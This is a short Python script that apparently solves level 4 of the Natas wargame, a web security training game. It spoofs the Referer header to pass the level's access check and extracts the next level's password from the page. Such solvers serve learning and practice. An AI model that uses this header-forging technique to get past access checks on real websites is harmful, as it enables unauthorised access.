from config import password_length
from utils import get_level_url, get_request_object, store_secret_and_print_message

level_number = 4


def get_secret():
    req = get_request_object(level_number)
    result = req.get(get_level_url(level_number), headers={"referer": get_level_url(level_number + 1) + "/"})
    text = result.text
    search = "natas5 is"

    if search in text:
        start_index = text.find(search) + len(search) + 1
        return text[start_index: start_index + password_length]
    else:
        return ""


secret = get_secret()
store_secret_and_print_message(level_number, secret)
